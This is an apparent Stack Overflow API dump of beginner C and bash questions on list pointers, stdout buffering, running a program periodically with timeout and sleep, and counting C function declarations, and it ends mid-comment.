lets take a look at how it works...</p>\n\n<p>The memory layout of the <code>List</code> structure is something like</p>\n\n<pre>\n+------+------+\n| head | size |\n+------+------+\n</pre>\n\n<p><sub>(The above illustration ignores possible padding.)</sub></p>\n\n<p>The variable <code>plist</code> points to the beginning of that structure:</p>\n\n<pre>\n+------+------+\n| head | size |\n+------+------+\n^\n|\nplist\n</pre>\n\n<p>As you can see it points to the location where <code>head</code> is stored. So by dereferencing <code>plist</code> we can get the <code>head</code> member.</p>\n\n<p>But it is <strong><em>bad code</em></strong> and you should never write code like that. It makes code hard to read, understand and maintain. Be explicit and use</p>\n\n<pre><code>Node * pnode = plist-&gt;head; /* set to start of list */\n</code></pre>\n\n<p>instead.</p>\n"}, {"tags": [], "owner": {"reputation": 3797, "user_id": 4022608, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27c9e8430426724a1f39c98b268f0a98?s=128&d=identicon&r=PG&f=1", "display_name": "Baldrickk", "link": "https://stackoverflow.com/users/4022608/baldrickk"}, "is_accepted": true, "score": 0, "last_activity_date": 1499242003, "creation_date": 1499242003, "answer_id": 44920407, "question_id": 44918988, "link": "https://stackoverflow.com/questions/44918988/why-a-pointer-to-list-can-also-point-to-node/44920407#44920407", "title": "why a pointer to List can also point to Node?", "body": "<p>So you know that this doesn't work.</p>\n\n<p>How should it work?</p>\n\n<pre><code>Node * pnode = *plist;\n</code></pre>\n\n<p>This was intended to get the first node. It actually tries to assign the list type as the first node. To make it work, we need to get the head node out of that.</p>\n\n<pre><code>Node * pnode = (*plist).head;\n</code></pre>\n\n<p>This now actually returns a <code>Node*</code>\nTo write this more succinctly:</p>\n\n<pre><code>Node * pnode = plist-&gt;head;\n</code></pre>\n"}], "owner": {"reputation": 112, "user_id": 6747018, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7390f145d007c59399030173f9de4632?s=128&d=identicon&r=PG&f=1", "display_name": "innerpeace", "link": "https://stackoverflow.com/users/6747018/innerpeace"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 1, "accepted_answer_id": 44920407, "answer_count": 2, "score": 1, "last_activity_date": 1499242003, "creation_date": 1499237768, "last_edit_date": 1499239426, "question_id": 44918988, "link": "https://stackoverflow.com/questions/44918988/why-a-pointer-to-list-can-also-point-to-node", "title": "why a pointer to List can also point to Node?", "body": "<p>I am a primer to c programming and reading c primer: 5th edition. What confuse me is why  <code>plist</code>  as a pointer to  List can also point to Node? </p>\n\n<p>sorry, I did not paste function ListItemCount to the code block. In this function, <code>Node * pnode = *plist;</code>,  Does that mean <code>plist</code> was converted as a ponter point to <code>Node</code> ?  If so, why does the program need to convert to a pointer to node instead of assigning  <code>plist-&gt;head</code> to <code>pnode</code>(a pointer to Node)?</p>\n\n<pre><code>typedef struct film {\n    char title[TSIZE];\n    int rating;\n} Item;\n\ntypedef struct node{\n    Item item;\n    // typical usage\n    struct node * next;\n} Node;\n\n\n/*\n* Note: to manage a linked list, we need  a pointer to its beginning,\n* and we've used typedef to make List the name for a pointer of this\n* type.\n*/\ntypedef struct list{\n    // should point to linked list Node\n    Node * head;\n\n    int size;\n} List;\n\n// TODO why  `plist`  as a pointer to  List can also point to Node?\n/* returns number of nodes */\nunsigned int ListItemCount(const List * plist)\n{\n    unsigned int count = 0;\n    Node * pnode = *plist; /* set to start of list */\n    while (pnode != NULL)\n    {\n        ++count;\n        pnode = pnode-&gt;next; /* set to next node */\n    }\n    return count;\n}\n</code></pre>\n"}, {"tags": ["c", "loops", "if-statement", "while-loop", "conditional"], "comments": [{"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "edited": false, "score": 3, "creation_date": 1499237639, "post_id": 44918835, "comment_id": 76813711, "body": "its called flushing"}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 1, "creation_date": 1499237640, "post_id": 44918835, "comment_id": 76813713, "body": "By default stdout is line buffered. This means that (unless you fill some internal buffer), it will not actually print anything until you print a newline, flush stdout or the program exits (which forces a flush of stdout). Your first program never prints a newline, flushes stdout or exits."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1499239886, "post_id": 44918835, "comment_id": 76815117, "body": "Flushing would also happen when your program terminates. But as your program never stops, this won&#39;t happen."}], "answers": [{"tags": [], "owner": {"reputation": 535, "user_id": 7917141, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/95mIe.jpg?s=128&g=1", "display_name": "Seoul", "link": "https://stackoverflow.com/users/7917141/seoul"}, "is_accepted": false, "score": 0, "last_activity_date": 1499237826, "creation_date": 1499237826, "answer_id": 44919008, "question_id": 44918835, "link": "https://stackoverflow.com/questions/44918835/if-statement-inside-while-that-depends-on-the-same-variable-that-while-depends-o/44919008#44919008", "title": "if statement inside while that depends on the same variable that while depends on", "body": "<p>Please read <a href=\"https://stackoverflow.com/a/8316330/7917141\">this</a>.</p>\n\n<blockquote>\n  <p>For example simply including a \"\\n\" in the printed stuff will typically flush it (because stdout is by default line-buffered when attached to a terminal).</p>\n</blockquote>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main() {\n    int i=0;\n    while(i&lt;10) {\n        if(i&lt;7)\n            printf(\"value is%d\",i++);\n        fflush(stdout);\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "is_accepted": false, "score": 2, "last_activity_date": 1499237837, "creation_date": 1499237837, "answer_id": 44919012, "question_id": 44918835, "link": "https://stackoverflow.com/questions/44918835/if-statement-inside-while-that-depends-on-the-same-variable-that-while-depends-o/44919012#44919012", "title": "if statement inside while that depends on the same variable that while depends on", "body": "<p>When you use <code>printf()</code> it just puts your data into <code>STDOUT</code> buffer, its purpose is not to display onto screen. but when you use <code>\\n</code> inside the <code>printf()</code> if flushes the <code>STDOUT</code> buffer on screen. you can also use <code>fflush()</code> if you are not using <code>\\n</code>. \nFrom <code>fflush()</code> <a href=\"http://man.he.net/?topic=fflush&amp;section=all\" rel=\"nofollow noreferrer\">man</a> page </p>\n\n<blockquote>\n  <p>For  output streams, fflush() forces a write of all user-space buffered\n         data for the given output or update stream via the stream's  underlying\n         write function.  For input streams, fflush() discards any buffered data\n         that has been fetched from the underlying file, but has not  been  con-\n         sumed by the application.  The open status of the stream is unaffected.</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "edited": false, "score": 0, "creation_date": 1499242339, "post_id": 44919036, "comment_id": 76816785, "body": "I think, the C language does not demand <code>exit</code> to flush... Am I wrong ?"}, {"owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "edited": false, "score": 1, "creation_date": 1499242590, "post_id": 44919036, "comment_id": 76816935, "body": "I checked now, yes, explicit <code>exit</code> is required to flush<code>Next,  all  open  streams  with  unwritten  buffered  data  are  \ufb02ushed,  all  open  streams  are closed, and all \ufb01les created by the tmpfile function are removed.</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499279250, "post_id": 44919036, "comment_id": 76842854, "body": "&quot;Until you flush STDOUT you&#39;re just accumulating what you&#39;re trying to print in a buffer.&quot; --&gt; Maybe. It is implementation defined behavior.   <code>stdout</code> might print out under various conditions and modes and not necessarily just accumulate. See <a href=\"https://stackoverflow.com/q/39536212/2410359\">What are the rules of automatic flushing stdout buffer in C?</a>"}, {"owner": {"reputation": 20930, "user_id": 6881240, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/dc1e27d7e9a3de2ca8e257cb7c72ff4a?s=128&d=identicon&r=PG&f=1", "display_name": "kabanus", "link": "https://stackoverflow.com/users/6881240/kabanus"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499279420, "post_id": 44919036, "comment_id": 76842942, "body": "@chux correct, but it will only &quot;print&quot; when it&#39;s &quot;flushed&quot;. I just gave the common occurrences. Obviously STDOUT is not flushed in OPs example."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499279757, "post_id": 44919036, "comment_id": 76843117, "body": "Disagree with only &quot;print&quot; when it&#39;s &quot;flushed&quot;.  It is implementation defined behavior when the printing occurs without a &quot;flush&quot;. With a `&quot;flush&quot; the behavior is well defined."}, {"owner": {"reputation": 20930, "user_id": 6881240, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/dc1e27d7e9a3de2ca8e257cb7c72ff4a?s=128&d=identicon&r=PG&f=1", "display_name": "kabanus", "link": "https://stackoverflow.com/users/6881240/kabanus"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499279906, "post_id": 44919036, "comment_id": 76843208, "body": "@chux Agree then, I misunderstood you. I&#39;m adding your point to the answer."}], "tags": [], "owner": {"reputation": 20930, "user_id": 6881240, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/dc1e27d7e9a3de2ca8e257cb7c72ff4a?s=128&d=identicon&r=PG&f=1", "display_name": "kabanus", "link": "https://stackoverflow.com/users/6881240/kabanus"}, "is_accepted": false, "score": 5, "last_activity_date": 1499279974, "last_edit_date": 1499279974, "creation_date": 1499237909, "answer_id": 44919036, "question_id": 44918835, "link": "https://stackoverflow.com/questions/44918835/if-statement-inside-while-that-depends-on-the-same-variable-that-while-depends-o/44919036#44919036", "title": "if statement inside while that depends on the same variable that while depends on", "body": "<p>First note both your programs never exit. When <code>i</code> hits <code>7</code> it's game over and your stuck forever doing nothing.</p>\n\n<p>Second note the only difference is printing a new line. That should have been your clue. Since the loop is infinite you never print a new line or exit - both things flush STDOUT. Until you flush STDOUT you're just accumulating what you're trying to print in a buffer. Only the flushing will get it on screen, and clean the buffer. </p>\n\n<p>@chux added a good point:</p>\n\n<p>Buffering of STDOUT (or IN or ERR) is implementation defined, meaning different flavors of Linux, Windows, and so forth may display different behavior. Obviously in the OP STDOUT is buffered - as no output appears.</p>\n"}], "owner": {"reputation": 101, "user_id": 8257270, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/640d86ace0661d8676d7021b8c7f384f?s=128&d=identicon&r=PG&f=1", "display_name": "GANESH GANI", "link": "https://stackoverflow.com/users/8257270/ganesh-gani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1499279974, "creation_date": 1499237310, "last_edit_date": 1499238729, "question_id": 44918835, "link": "https://stackoverflow.com/questions/44918835/if-statement-inside-while-that-depends-on-the-same-variable-that-while-depends-o", "title": "if statement inside while that depends on the same variable that while depends on", "body": "<p>consider the below programs.\nI would like to know why this codes behave in different way.Thankyou in advance.</p>\n\n<p>this doesnot print any    </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i = 0;\n\n    while(i &lt; 10) {\n        if(i &lt; 7)\n            printf(\"value is%d\", i++); \n    }\n}\n</code></pre>\n\n<p>while this does</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    int i = 0;\n\n    while(i &lt; 10) {\n        if(i &lt; 7)\n            printf(\"value is%d\\n\", i++);\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "bash"], "answers": [{"comments": [{"owner": {"reputation": 36, "user_id": 8071473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53380b1777f03019a5275bf391461bf?s=128&d=identicon&r=PG&f=1", "display_name": "al3xkr", "link": "https://stackoverflow.com/users/8071473/al3xkr"}, "edited": false, "score": 0, "creation_date": 1499236804, "post_id": 44918435, "comment_id": 76813260, "body": "Doesn&#39;t &#39;exec ./program &amp;&amp; sleep 10&#39; work? If I understood your question it should do the trick"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499236964, "post_id": 44918435, "comment_id": 76813346, "body": "When it executed terminal got closed instantly: exec ./program &amp;&amp; sleep 10"}, {"owner": {"reputation": 36, "user_id": 8071473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53380b1777f03019a5275bf391461bf?s=128&d=identicon&r=PG&f=1", "display_name": "al3xkr", "link": "https://stackoverflow.com/users/8071473/al3xkr"}, "edited": false, "score": 0, "creation_date": 1499237253, "post_id": 44918435, "comment_id": 76813512, "body": "Try removing the exec. Also, does your program run as expected on its own?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499237485, "post_id": 44918435, "comment_id": 76813632, "body": "Nope didn&#39;t work nothing happened. And to close program i have to manually press CTRL + C to close it.. I wanna set time interval so it loads few seconds and terminate and then restart again like a loop until i close the terminal i hope you understand my point right?"}, {"owner": {"reputation": 36, "user_id": 8071473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53380b1777f03019a5275bf391461bf?s=128&d=identicon&r=PG&f=1", "display_name": "al3xkr", "link": "https://stackoverflow.com/users/8071473/al3xkr"}, "edited": false, "score": 0, "creation_date": 1499237898, "post_id": 44918435, "comment_id": 76813873, "body": "Then try &#39;./program ;; sleep 10 &amp;&amp; ./program&#39;. Let me know if it works"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499238724, "post_id": 44918435, "comment_id": 76814359, "body": "didn&#39;t work either.. ./file.sh &amp;&amp; sleep 10 &amp;&amp; ./file.sh i try that with 2 sec still no hope."}, {"owner": {"reputation": 36, "user_id": 8071473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53380b1777f03019a5275bf391461bf?s=128&d=identicon&r=PG&f=1", "display_name": "al3xkr", "link": "https://stackoverflow.com/users/8071473/al3xkr"}, "edited": false, "score": 0, "creation_date": 1499239512, "post_id": 44918435, "comment_id": 76814858, "body": "Ok. How about &#39;timeout 10s ./program &amp;&amp; timeout 10s ./program&#39;?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499255756, "post_id": 44918435, "comment_id": 76826434, "body": "Yes it terminated after 10 secs but &amp;&amp; didn&#39;t work and one more thing i wanna run that bash code for 10 sec then terminate and restart in loop until i close the terminal to stop that.."}], "tags": [], "owner": {"reputation": 36, "user_id": 8071473, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c53380b1777f03019a5275bf391461bf?s=128&d=identicon&r=PG&f=1", "display_name": "al3xkr", "link": "https://stackoverflow.com/users/8071473/al3xkr"}, "is_accepted": false, "score": 0, "last_activity_date": 1499256323, "last_edit_date": 1499256323, "creation_date": 1499235862, "answer_id": 44918435, "question_id": 44918230, "link": "https://stackoverflow.com/questions/44918230/run-bash-command-at-x-time-and-terminate-for-x-time/44918435#44918435", "title": "Run Bash Command At X Time and Terminate for X Time", "body": "<p>You can use the <code>sleep</code> command. For example: <code>exec ./program &amp;&amp; sleep n</code> where n is the time you want the command to sleep. If you want you could put it in a while loop inside an <code>sh</code> script and run it continuously.</p>\n\n<p>To run it continuously until you close the terminal:</p>\n\n<pre><code>while true\ndo\n   echo \"[CTRL+C] to stop...\"\n   timeout 10s ./program\ndone\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499256014, "post_id": 44925575, "comment_id": 76826591, "body": "Thank you that worked! What dose actually sleep 10 doing here?"}, {"owner": {"reputation": 35869, "user_id": 7512, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d064a7aca29011d3246302b27c41f4d9?s=128&d=identicon&r=PG", "display_name": "slim", "link": "https://stackoverflow.com/users/7512/slim"}, "edited": false, "score": 0, "creation_date": 1499257894, "post_id": 44925575, "comment_id": 76828069, "body": "@Noor For most UNIX commands, use <code>man</code> to get documentation e.g. <code>man sleep</code> and <code>man timeout</code>. Sometimes it doesn&#39;t work because the command is a shell built-in. Then look for it in <code>man bash</code>, <code>info bash</code> or the bash documentation on the web."}, {"owner": {"reputation": 2844, "user_id": 6908895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoRqq.jpg?s=128&g=1", "display_name": "Ljm Dullaart", "link": "https://stackoverflow.com/users/6908895/ljm-dullaart"}, "edited": false, "score": 0, "creation_date": 1499258545, "post_id": 44925575, "comment_id": 76828599, "body": "You asked, that after 10 seconds, the program should start again. So after the program is terminated, the script sleeps 10 seconds."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "edited": false, "score": 0, "creation_date": 1499265152, "post_id": 44925575, "comment_id": 76833784, "body": "This solved the issue thanks anyway! I marked as solved!"}], "tags": [], "owner": {"reputation": 2844, "user_id": 6908895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoRqq.jpg?s=128&g=1", "display_name": "Ljm Dullaart", "link": "https://stackoverflow.com/users/6908895/ljm-dullaart"}, "is_accepted": true, "score": 2, "last_activity_date": 1499255769, "creation_date": 1499255769, "answer_id": 44925575, "question_id": 44918230, "link": "https://stackoverflow.com/questions/44918230/run-bash-command-at-x-time-and-terminate-for-x-time/44925575#44925575", "title": "Run Bash Command At X Time and Terminate for X Time", "body": "<p>The answer is, if I understand correctly, a combination of <code>sleep</code> and <code>timout</code>:</p>\n\n<pre><code>while :; do\n    timout 10s ./program\n    # display some results\n    sleep 10\ndone\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5896280"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 44925575, "answer_count": 2, "score": 0, "last_activity_date": 1499256323, "creation_date": 1499235112, "last_edit_date": 1499237291, "question_id": 44918230, "link": "https://stackoverflow.com/questions/44918230/run-bash-command-at-x-time-and-terminate-for-x-time", "title": "Run Bash Command At X Time and Terminate for X Time", "body": "<p>Hi im working on a simple bash coding i don't know how to accomplish this and this might be easy for you guys please help.</p>\n\n<p>I have a simple program on file.sh </p>\n\n<pre><code>#!/bin/bash\n\n./program\n</code></pre>\n\n<p>This ./program is a compiled version of C program which i complied using GCC im trying to use at in bash script to execute this program for few seconds and then terminate that after x interval time and restart again.</p>\n\n<p><strong>I hope you got my point?</strong></p>\n\n<p>Example: Run file.sh for 10 sec and I'll display the result from ./program C program and then after 10 sec it will restart again.</p>\n"}, {"tags": ["c", "shell", "scripting", "code-analysis"], "comments": [{"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 2, "creation_date": 1499234897, "post_id": 44918129, "comment_id": 76812226, "body": "I can only imagine the sheer idiocy of this kind of paperwork... Still, for C you may get a good approximation of what you are asking parsing the output of ctags."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499235003, "post_id": 44918129, "comment_id": 76812283, "body": "The <a href=\"http://man7.org/linux/man-pages/man1/egrep.1.html\" rel=\"nofollow noreferrer\"><code>grep</code></a> command comes to mind."}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499235216, "post_id": 44918129, "comment_id": 76812389, "body": "@Someprogrammerdude: even just for C writing a regex to match moderately complex function declarations is a horrible mess."}, {"owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1499235444, "post_id": 44918129, "comment_id": 76812506, "body": "@MatteoItalia I know right? But paperwork is a part of my job so I don&#39;t mind. I just tried using ctags (for the first time) using: <code>ctags --recurse=yes *</code>. It created a mess of a file and I couldn&#39;t see any immediate pattern in the output that would indicate whether something was a function or not?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1499235490, "post_id": 44918129, "comment_id": 76812535, "body": "@MatteoItalia I know! ;) Actually, it&#39;s <i>impossible</i> to write a regex to match all possible function declarations, since there may be nested parentheses, which regexes really can&#39;t handle. It&#39;s just a way to get the OP to search a little more, since this question is off-topic here."}, {"owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499235717, "post_id": 44918129, "comment_id": 76812665, "body": "@Someprogrammerdude How is this question about code analysis off-topic? Also I searched first, naturally, but didn&#39;t find anything satisfactory yet."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 2, "creation_date": 1499235831, "post_id": 44918129, "comment_id": 76812730, "body": "It sounds like you need <code>cproto</code> which will scan C-source files creating a concise list of the function declaration. You can collected the declarations from all files in your project. It does a wonderful job. <a href=\"http://invisible-island.net/cproto/cproto.html\" rel=\"nofollow noreferrer\"><b>http://invisible-island.net/cproto/cproto.html</b></a>. Give it a look."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1499235852, "post_id": 44918129, "comment_id": 76812744, "body": "The off-topic part is that you ask for links to off-site resource or tools. From the section <a href=\"http://stackoverflow.com/help/on-topic\">&quot;What topics can I ask about here?&quot;</a> in <a href=\"http://stackoverflow.com/help\">the help pages</a>: &quot;Questions asking us to <i>recommend or find a book, tool, software library, tutorial or other off-site resourc</i>e are off-topic for Stack Overflow as they tend to attract opinionated answers and spam. Instead, describe the problem and what has been done so far to solve it.&quot;"}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 2, "creation_date": 1499235999, "post_id": 44918129, "comment_id": 76812801, "body": "@Nextor: look for lines with an <code>f</code> in the last field; those are functions; the first field is the function name, the rest isn&#39;t interesting for you. Counting these lines will give you the number of function definitions in your project."}, {"owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499236001, "post_id": 44918129, "comment_id": 76812805, "body": "@Someprogrammerdude Ah, thank you! I&#39;ll write better questions in the future, and edit this one a little bit now."}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499236142, "post_id": 44918129, "comment_id": 76812883, "body": "@Someprogrammerdude: and I know that you know, that&#39;s why I didn&#39;t understand why you suggested such a terrible solution \ud83d\ude41; still, it was important to point out that regexes are the wrong way, last time I had to convince someone of the impossibility of matching C declarations with regexes it took a while and wasn&#39;t fun (I had to revise function pointers and array pointers syntax). \ud83d\ude00"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1499236213, "post_id": 44918129, "comment_id": 76812916, "body": "@MatteoItalia Like &quot;they&quot; say: You have a problem. You solve it with regular expressions. Now you have <i>two</i> problems. :)"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1499236436, "post_id": 44918129, "comment_id": 76813018, "body": "@Neztor While using <code>grep</code> might not be the best tool for extracting function declarations (for simple declarations it&#39;s certainly works though) once you have the output from <code>ctags</code> or <code>cproto</code> you can use <code>grep</code> to extract the information you want. For example using the file generated by <code>ctags</code> you can 